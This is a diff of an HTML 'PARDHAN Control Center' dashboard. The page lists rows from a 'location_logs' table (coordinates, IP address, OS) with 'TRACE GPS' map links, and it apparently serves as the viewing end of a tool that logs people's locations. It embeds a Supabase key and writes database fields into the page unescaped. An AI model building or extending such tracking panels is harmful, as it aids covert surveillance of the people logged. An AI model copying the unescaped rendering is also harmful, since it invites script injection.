@@ -4,46 +4,42 @@
     <title>PARDHAN Control Center</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { background: #0b0e14; color: #adbac7; font-family: 'Segoe UI', sans-serif; padding: 25px; }
-        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #30363d; padding-bottom: 15px; margin-bottom: 25px; }
-        table { width: 100%; border-collapse: collapse; background: #161b22; border-radius: 12px; overflow: hidden; }
-        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #30363d; font-size: 14px; }
-        th { background: #21262d; color: #58a6ff; }
-        .map-btn { background: #238636; color: white; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; text-decoration: none; font-weight: bold; }
+        body { background: #030712; color: #adbac7; font-family: 'Outfit', sans-serif; padding: 30px; }
+        .head { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #1f2937; padding-bottom: 20px; margin-bottom: 30px; }
+        table { width: 100%; border-collapse: collapse; background: #0f172a; border-radius: 15px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        th, td { padding: 18px; text-align: left; border-bottom: 1px solid #1f2937; }
+        th { background: #1e293b; color: #38bdf8; font-weight: 900; }
+        .map-btn { background: #059669; color: white; border: none; padding: 10px 15px; border-radius: 8px; cursor: pointer; text-decoration: none; font-weight: bold; font-size: 12px; }
+        .map-btn:hover { background: #10b981; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1 style="color: #f85149; letter-spacing: -1px;">🚀 PARDHAN LOGS [v6.0 PRO]</h1>
-        <button onclick="loadData()" style="padding: 10px 20px; cursor: pointer; border-radius: 6px; border: none; background: #21262d; color: white;">Refresh</button>
+    <div class="head">
+        <h1 style="color: #ef4444;">🚀 PARDHAN LOGS [v7.0 PRO]</h1>
+        <button onclick="fetchLogs()" style="padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold;">Refresh Logs</button>
     </div>
 
     <table>
         <thead>
             <tr>
-                <th>Date & Time</th>
+                <th>Time & Date</th>
                 <th>Location (Lat, Long)</th>
                 <th>Battery & Tag</th>
-                <th>Device Platform</th>
-                <th>Action</th>
+                <th>Platform</th>
+                <th>Map Action</th>
             </tr>
         </thead>
-        <tbody id="table-body">
-            <tr><td colspan="5">Loading data...</td></tr>
-        </tbody>
+        <tbody id="log-body"></tbody>
     </table>
 
 <script>
     const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
-    const supabase = window.supabase.createClient(SB_URL, SB_KEY);
+    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
 
-    async function loadData() {
-        const { data, error } = await supabase.from('location_logs').select('*').order('created_at', { ascending: false });
-        const body = document.getElementById('table-body');
-        
-        if (error) { body.innerHTML = `<tr><td colspan="5">Error: ${error.message}</td></tr>`; return; }
-        
+    async function fetchLogs() {
+        const { data } = await supabaseClient.from('location_logs').select('*').order('created_at', { ascending: false });
+        const body = document.getElementById('log-body');
         body.innerHTML = "";
         data.forEach(log => {
             body.innerHTML += `
@@ -52,11 +48,11 @@
                     <td><b>${log.latitude.toFixed(5)}, ${log.longitude.toFixed(5)}</b></td>
                     <td>${log.ip}</td>
                     <td>${log.os_info}</td>
-                    <td><a class="map-btn" href="https://www.google.com/maps?q=$${log.latitude},${log.longitude}" target="_blank">📍 TRACE</a></td>
+                    <td><a class="map-btn" href="https://www.google.com/maps?q=${log.latitude},${log.longitude}" target="_blank">TRACE GPS</a></td>
                 </tr>`;
         });
     }
-    window.onload = loadData;
+    window.onload = fetchLogs;
 </script>
 </body>
 </html>
